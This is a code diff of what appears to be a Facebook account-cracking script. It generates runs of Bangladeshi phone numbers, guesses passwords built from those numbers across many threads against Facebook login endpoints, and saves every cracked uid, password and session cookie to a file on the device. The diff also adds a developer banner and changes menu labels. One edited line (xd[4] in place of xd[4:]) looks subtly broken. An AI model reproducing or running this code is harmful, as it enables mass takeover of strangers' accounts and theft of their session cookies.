@@ -48,6 +48,21 @@ def referer():
     return ''.join(password_list)
 
 
+def clear():
+        os.system("clear")
+
+def logo():
+        aci = f'''    //   ) )                                      
+   //___/ /  __     ( )   __      ___      ___    
+  / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
+ //       //      / / //   / / //       //        
+//       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Free[/r]\n{sort.line()}'''
+        print(aci)
+        
+
+
+
+
 loop = 0
 oks = []
 
@@ -74,23 +89,23 @@ user = []
 
 def main():
     inp = int(input("How many do want to chek? -> "))
-    print("Give you number ex: 01850819272")
-    code = input("Put your number -> ")
+    print("Give you code number ex: 01850819272")
+    code = input("Put your code -> ")
 
     for i in range(inp):
-        # gg=str(random.choice(range(10000000,99999999)))
+        #gg=str(random.choice(range(10000000,99999999)))
         gg = str(int(code) + i)
         user.append(gg)
 
-    print(" Method 1")
+    print(" Method 1 (Best)")
     print(" Method 2")
     print(" Method 3")
     print(" Method 4")
     print(" Method 5")
-    print(" Method 6 Normal(Best)")
+    print(" Method 6")
     meth = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
     if meth in ["1", "a", "A"]:
-        fb = "m"
+        fb = "mbasic"
     elif meth in ["2", "b", "B"]:
         fb = "x"
     elif meth in ["3", "c", "C"]:
@@ -100,13 +115,17 @@ def main():
     elif meth in ["5", "e", "E"]:
         fb = "free"
     else:
-        fb = "mbasic"
-    with ThreadPool(max_workers=30) as update:
+        fb = "m"
+    with ThreadPool(max_workers=20) as update:
+    	
+    	
+        clear()
+    
 
         for xd in user:
             uid = "0" + xd
 
-            pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:]] #,"bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####"]
+            pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:]] #,"bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####"]
 
             update.submit(host, uid, pwx, meth, fb)
 
@@ -167,7 +186,7 @@ def host(uid, pwx, meth, fb):
                     coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                     xx = coki.split("c_user=")[1]
                     xd = xx[:15].replace(";", "  ")
-                    print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
+                    print(f"\r\r[SHADID-OK] {xd} <> {ps}\n")  #[Cookies]{coki}
                     open("/sdcard/SHADID-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
                     break
                     
